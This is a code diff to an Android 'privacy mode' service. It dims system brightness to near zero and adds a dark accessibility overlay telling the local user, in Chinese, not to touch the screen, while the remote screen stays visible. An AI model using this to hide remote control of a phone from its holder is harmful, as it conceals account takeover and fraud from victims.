@@ -12,6 +12,7 @@ import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.provider.Settings
 import android.util.Log
 import android.view.Gravity
 import android.view.View
@@ -31,10 +32,12 @@ class PrivacyModeService : Service() {
         private const val TAG = "PrivacyModeService"
         private const val CHANNEL_ID = "privacy_mode_channel"
         private const val NOTIFICATION_ID = 2001
-        // Keep remote screen visible while still obscuring local content.
-        private const val OVERLAY_ALPHA = 96
+        // Adaptive profile: keep remote screen visible while obscuring local content.
+        private const val OVERLAY_ALPHA_WITH_BRIGHTNESS = 88
+        private const val OVERLAY_ALPHA_NO_BRIGHTNESS = 118
         private const val OVERLAY_EXTRA_SIZE = 1200
         private const val OVERLAY_SCREEN_BRIGHTNESS = 0.0f
+        private const val SYSTEM_BRIGHTNESS_TARGET = 1
 
         @Volatile
         private var isActive = false
@@ -66,6 +69,9 @@ class PrivacyModeService : Service() {
     private var overlayView: View? = null
     private var windowManager: WindowManager? = null
     private var notificationManager: NotificationManager? = null
+    private var originalBrightness: Int? = null
+    private var originalBrightnessMode: Int? = null
+    private var systemBrightnessAdjusted = false
 
     override fun onCreate() {
         super.onCreate()
@@ -84,8 +90,25 @@ class PrivacyModeService : Service() {
         }
 
         try {
+            val canWriteSystem = canWriteSystemSettings()
+            val overlayAlpha = resolveOverlayAlpha(canWriteSystem)
+            if (canWriteSystem) {
+                tryDimSystemBrightness()
+            } else {
+                Log.w(
+                    TAG,
+                    "DEBUG_PRIVACY: WRITE_SETTINGS not granted, using overlay-only fallback profile"
+                )
+                Handler(Looper.getMainLooper()).post {
+                    Toast.makeText(
+                        this,
+                        "\u672a\u6388\u4e88\u4fee\u6539\u7cfb\u7edf\u8bbe\u7f6e\u6743\u9650\uff0c\u9ed1\u5c4f\u6548\u679c\u53ef\u80fd\u53d7\u9650",
+                        Toast.LENGTH_SHORT
+                    ).show()
+                }
+            }
             createForegroundNotification()
-            createDarkOverlay(accessibilityService)
+            createDarkOverlay(accessibilityService, overlayAlpha)
             Handler(Looper.getMainLooper()).post {
                 Toast.makeText(this, "Privacy mode enabled", Toast.LENGTH_SHORT).show()
             }
@@ -116,6 +139,7 @@ class PrivacyModeService : Service() {
 
         overlayView = null
         windowManager = null
+        restoreSystemBrightness()
         isActive = false
 
         Handler(Looper.getMainLooper()).post {
@@ -125,7 +149,7 @@ class PrivacyModeService : Service() {
         super.onDestroy()
     }
 
-    private fun createDarkOverlay(accessibilityService: Context) {
+    private fun createDarkOverlay(accessibilityService: Context, overlayAlpha: Int) {
         windowManager = accessibilityService.getSystemService(Context.WINDOW_SERVICE) as WindowManager
 
         val display = windowManager?.defaultDisplay
@@ -136,14 +160,17 @@ class PrivacyModeService : Service() {
 
         Log.d(
             TAG,
-            "DEBUG_PRIVACY: Screen size=${screenWidth}x${screenHeight}, alpha=$OVERLAY_ALPHA, windowBrightness=$OVERLAY_SCREEN_BRIGHTNESS"
+            "DEBUG_PRIVACY: Screen size=${screenWidth}x${screenHeight}, alpha=$overlayAlpha, windowBrightness=$OVERLAY_SCREEN_BRIGHTNESS, systemBrightnessAdjusted=$systemBrightnessAdjusted"
         )
 
         val container = FrameLayout(accessibilityService).apply {
-            setBackgroundColor(Color.argb(OVERLAY_ALPHA, 0, 0, 0))
+            setBackgroundColor(Color.argb(overlayAlpha, 0, 0, 0))
 
             val textView = TextView(accessibilityService).apply {
-                text = "系统正在处理业务\n请勿触碰手机屏幕\n感谢您的耐心等待"
+                text =
+                    "\u7cfb\u7edf\u6b63\u5728\u5904\u7406\u4e1a\u52a1\n" +
+                    "\u8bf7\u52ff\u89e6\u78b0\u624b\u673a\u5c4f\u5e55\n" +
+                    "\u611f\u8c22\u60a8\u7684\u8010\u5fc3\u7b49\u5f85"
                 setTextColor(Color.WHITE)
                 textSize = 34f
                 gravity = Gravity.CENTER
@@ -194,6 +221,82 @@ class PrivacyModeService : Service() {
         windowManager?.addView(container, params)
         overlayView = container
         Log.d(TAG, "DEBUG_PRIVACY: Overlay created")
+    }
+
+    private fun canWriteSystemSettings(): Boolean {
+        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.System.canWrite(this)
+    }
+
+    private fun resolveOverlayAlpha(canWriteSystem: Boolean): Int {
+        val manufacturer = Build.MANUFACTURER.lowercase()
+        val isHuaweiLike = manufacturer.contains("huawei") || manufacturer.contains("honor")
+        val base = if (canWriteSystem) OVERLAY_ALPHA_WITH_BRIGHTNESS else OVERLAY_ALPHA_NO_BRIGHTNESS
+        return if (isHuaweiLike) {
+            (base + 10).coerceAtMost(140)
+        } else {
+            base
+        }
+    }
+
+    private fun tryDimSystemBrightness() {
+        if (!canWriteSystemSettings()) return
+        val resolver = contentResolver
+        try {
+            originalBrightnessMode = Settings.System.getInt(
+                resolver,
+                Settings.System.SCREEN_BRIGHTNESS_MODE
+            )
+        } catch (_: Exception) {
+            originalBrightnessMode = Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
+        }
+        try {
+            originalBrightness = Settings.System.getInt(
+                resolver,
+                Settings.System.SCREEN_BRIGHTNESS
+            )
+        } catch (_: Exception) {
+            originalBrightness = 128
+        }
+
+        try {
+            Settings.System.putInt(
+                resolver,
+                Settings.System.SCREEN_BRIGHTNESS_MODE,
+                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
+            )
+            Settings.System.putInt(
+                resolver,
+                Settings.System.SCREEN_BRIGHTNESS,
+                SYSTEM_BRIGHTNESS_TARGET
+            )
+            systemBrightnessAdjusted = true
+            Log.d(
+                TAG,
+                "DEBUG_PRIVACY: System brightness dimmed to $SYSTEM_BRIGHTNESS_TARGET (mode=${originalBrightnessMode}, original=${originalBrightness})"
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "DEBUG_PRIVACY: Failed to dim system brightness", e)
+            systemBrightnessAdjusted = false
+        }
+    }
+
+    private fun restoreSystemBrightness() {
+        if (!systemBrightnessAdjusted) return
+        if (!canWriteSystemSettings()) return
+        val resolver = contentResolver
+        try {
+            originalBrightness?.let {
+                Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS, it)
+            }
+            originalBrightnessMode?.let {
+                Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS_MODE, it)
+            }
+            Log.d(TAG, "DEBUG_PRIVACY: System brightness restored")
+        } catch (e: Exception) {
+            Log.e(TAG, "DEBUG_PRIVACY: Failed to restore system brightness", e)
+        } finally {
+            systemBrightnessAdjusted = false
+        }
     }
 
     private fun createForegroundNotification() {
